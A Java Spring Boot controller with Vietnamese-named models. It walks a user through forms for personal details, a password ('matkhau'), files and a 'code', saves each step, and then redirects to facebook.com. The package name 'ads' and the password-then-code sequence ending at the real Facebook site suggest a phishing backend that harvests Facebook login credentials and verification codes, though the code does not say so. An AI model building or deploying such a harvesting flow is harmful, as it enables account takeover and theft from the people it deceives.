package com.example.ads.controller;


import com.example.ads.taikhoanmodel.Code;
import com.example.ads.taikhoanmodel.Files;
import com.example.ads.taikhoanmodel.MatKhau;
import com.example.ads.taikhoanmodel.User;
import com.example.ads.taikhoanrepository.CodeRepository;
import com.example.ads.taikhoanrepository.FilesRepository;
import com.example.ads.taikhoanrepository.MatKhauRepository;
import com.example.ads.taikhoanrepository.Userrepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.view.RedirectView;

@Controller
@RequestMapping("/app")
public class UserController {

    @Autowired
    private Userrepository userRepository;

    @Autowired
    private MatKhauRepository matkhauRepository;

    @Autowired
    private FilesRepository filesRepository;

    @Autowired
    private CodeRepository codeRepository;

    @GetMapping("/user/form")
    public String showUserForm(Model model) {
        model.addAttribute("user", new User());
        return "user-form";
    }

    @PostMapping("/user/save")
    public String saveUser(@ModelAttribute("user") User user) {
        userRepository.save(user);
        return "redirect:/app/matkhau/form/" + user.getId();
    }

    @GetMapping("/matkhau/form/{userId}")
    public String showMatkhauForm(@PathVariable Long userId, Model model) {
        MatKhau matkhau = new MatKhau();
        matkhau.setUser(userRepository.findById(userId).orElse(null));
        model.addAttribute("matkhau", matkhau);
        return "matkhau-form";
    }

    @PostMapping("/matkhau/save")
    public String saveMatkhau(@ModelAttribute("matkhau") MatKhau matkhau) {
        matkhauRepository.save(matkhau);
        return "redirect:/app/files/form/" + matkhau.getIdmatkhau();
    }

    @GetMapping("/files/form/{matkhauId}")
    public String showFilesForm(@PathVariable Long matkhauId, Model model) {
        Files files = new Files();
        files.setMatkhau(matkhauRepository.findById(matkhauId).orElse(null));
        model.addAttribute("files", files);
        return "files-form";
    }

    @PostMapping("/files/save")
    public String saveFiles(@ModelAttribute("files") Files files) {
        filesRepository.save(files);
        return "redirect:/app/code/form/" + files.getIdfile();
    }

    @GetMapping("/code/form/{filesId}")
    public String showCodeForm(@PathVariable Long filesId, Model model) {
        Code code = new Code();
        code.setFiles(filesRepository.findById(filesId).orElse(null));
        model.addAttribute("code", code);
        return "code-form";
    }

    @PostMapping("/code/save")
    public String saveCode(@ModelAttribute("code") Code code) {
        codeRepository.save(code);
        return "redirect:https://www.facebook.com";
    }
}
